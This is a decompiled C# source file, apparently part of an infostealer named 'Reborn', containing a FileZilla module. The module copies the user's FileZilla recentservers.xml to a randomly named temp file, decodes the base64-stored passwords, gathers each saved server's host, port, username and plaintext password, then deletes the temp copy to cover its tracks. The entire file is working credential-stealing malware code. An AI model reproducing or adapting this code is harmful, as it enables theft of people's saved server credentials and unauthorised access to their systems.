using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Text;
using Reborn.Helper;

namespace Reborn.FTP
{
	// Token: 0x02000021 RID: 33
	internal class FileZilla
	{
		// Token: 0x060000D5 RID: 213 RVA: 0x00008E50 File Offset: 0x00007050
		public static List<PassData> Initialise()
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
			{
				return null;
			}
			List<PassData> result;
			try
			{
				List<PassData> list = new List<PassData>();
				string text = Path.GetTempPath() + "/" + Misc.GetRandomString() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", text, true);
				string contents = File.ReadAllText(text).Replace("encoding=\"base64\"", string.Empty);
				File.WriteAllText(text, contents);
				using (DataSet dataSet = new DataSet())
				{
					dataSet.ReadXml(text);
					for (int i = 0; i < dataSet.Tables["Server"].Rows.Count; i++)
					{
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(dataSet.Tables["Server"].Rows[i]["Pass"].ToString()));
						try
						{
							list.Add(new PassData
							{
								Url = dataSet.Tables["Server"].Rows[i]["Host"] + ":" + dataSet.Tables["Server"].Rows[i]["Port"],
								Login = dataSet.Tables["Server"].Rows[i]["User"].ToString(),
								Password = @string,
								Program = "FileZilla"
							});
						}
						catch
						{
						}
					}
				}
				File.Delete(text);
				result = list;
			}
			catch (Exception arg)
			{
				Console.WriteLine("FileZilla : " + arg);
				result = null;
			}
			return result;
		}
	}
}
